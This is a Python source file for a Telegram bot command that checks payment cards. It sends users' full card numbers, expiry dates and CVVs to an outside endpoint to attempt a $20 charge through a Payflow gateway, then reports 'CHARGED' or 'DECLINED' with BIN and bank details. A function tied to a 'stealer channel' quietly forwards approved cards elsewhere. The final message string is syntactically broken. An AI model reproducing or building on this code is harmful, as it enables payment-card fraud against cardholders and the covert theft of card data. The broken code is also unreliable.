import httpx
import time
import asyncio
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from BOT.tools.hit_stealer import send_hit_if_approved

# Updated Stealer Channel ID
STEALER_CHANNEL_ID = -1003627495953

async def send_hit_if_approved(client: Client, text: str):
    try:
        await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
    except Exception as e:
        print(f"[Stealer Error] Failed to forward: {e}")

@Client.on_message(filters.command("pf", [".", "/"]))
async def payflow_cmd(Client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(Client, message)

        gateway = "Payflow 20$ 💸"

        if checkall[0] == False:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        
        if getcc == False:
            resp = f"〈<a href='tg://user?id={user_id}'>{first_name}</a>〉-» Payflow 20$ - CHECK\n\n〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway} \n\n<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /pf cc|month|year|cvc"
            await message.reply_text(resp, quote=True)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        endpoint_url = f"https://onyxenvbot.up.railway.app/payflow/key=yashikaaa/cc={fullcc}"

        firstresp = f"\n↯ Checking.\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝙚ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□\n</b>\n"
        msg = await message.reply_text(firstresp, quote=True)

        secondresp = f"\n↯ Checking..\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝙚ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□\n"
        await asyncio.sleep(0.5)
        await msg.edit_text(secondresp)

        start = time.perf_counter()
        
        # Retry logic to handle Railway cold-starts or connection issues
        max_retries = 2
        status = "Error"
        response = "Request failed"
        
        async with httpx.AsyncClient(timeout=45, follow_redirects=True, limits=httpx.Limits(max_keepalive_connections=5, max_connections=10)) as session:
            for attempt in range(max_retries):
                try:
                    response_obj = await session.get(endpoint_url)
                    result_json = response_obj.json()
                    api_status = result_json.get("status", "Unknown").lower()
                    response = result_json.get("response", "No response message")
                    
                    if "approved" in api_status:
                        status = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 🔥"
                    elif "declined" in api_status or "failed" in api_status:
                        status = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ✖️"
                    else:
                        status = api_status.upper()
                    
                    # If we got a real response, break the retry loop
                    break
                    
                except (httpx.RequestError, ValueError) as e:
                    if attempt == max_retries - 1:
                        status = "Error"
                        response = f"Request failed: {e}"
                    else:
                        await asyncio.sleep(1) # Wait a bit before retry
                        continue

        getbin = await get_bin_details(cc)

        thirdresp = f"\n↯ Checking...\n\n- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> \n- 𝐆𝐚𝐭𝐞ᴡ𝐚𝐲 -  <i>{gateway}</i>\n- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■\n"
        await asyncio.sleep(0.5)
        await msg.edit_text(thirdresp)

        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
        
        end = time.perf_counter()
        elapsed_time = round(end - start, 2)

        finalresp = f"\n[〄] 𝘾𝘾        ⟶ <code>{fullcc}</code>\n[〄] 𝙎𝙏𝘼𝙏𝙐𝙎    ⟶ {status}\n[〄] 𝙍𝙀𝙎𝙐𝙇𝙏    ⟶ {response}\n\n━━━〔 INFO 〕━━━\n[〄] 𝘽𝙄𝙉 ⟶ {brand} | {type_} - {level}\n[〄] 𝘽𝘼𝙉𝙆 ⟶ {bank}\\n[〄] 𝘾𝙊𝙐𝙉𝙏𝗥𝗬⟶ {country} {flag}\\n\\n━━━〔 META 〕━━━\\n[〄] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ⟶ {gateway}\\n[〄] 𝙏𝙄𝙈𝙀 ⟶  {elapsed_time:0.2f}s\\n[〄] 𝘾𝙃𝙀𝘾𝙆𝙀𝘿 𝘽𝙔 𝙏𝙄𝙈𝙀 ⟶<a href='tg://user?id={user_id}'>{first_name}</a> [{role}] \\n\\n━━━〔 OWNER 〕━━━\\n<a href=\"tg://user?id=8340881349\">╏╠══[𝍖𝍖𝍖 𝚂𝙿𝙸𝙳𝙴𝚁 𝍖𝍖𝍖]      🕷️</a>\\n\"\"\"

        await asyncio.sleep(0.5)
        await msg.edit_text(finalresp)

        await setantispamtime(user_id)
        await deductcredit(user_id)

        if "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿" in status or "𝘾𝙃𝘼𝙍𝙂𝙀𝘿" in status:
            await sendcc(finalresp, session)

    except Exception:
        import traceback
        await error_log(traceback.format_exc())
